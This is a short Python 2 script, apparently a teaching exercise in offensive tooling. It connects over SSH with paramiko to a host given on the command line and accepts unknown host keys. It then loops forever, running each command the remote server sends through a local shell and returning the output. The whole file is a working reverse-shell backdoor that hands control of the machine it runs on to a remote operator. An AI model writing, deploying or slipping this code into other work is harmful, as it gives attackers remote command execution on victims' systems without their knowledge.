import threading
import paramiko
import subprocess
import sys

def ssh_cmd(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # client.load_host_keys('/.ssh/known_host')
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
        # print(ssh_session.recv(1024))
    return

ssh_cmd(sys.argv[1], sys.argv[2], sys.argv[3], 'ClientConnected')
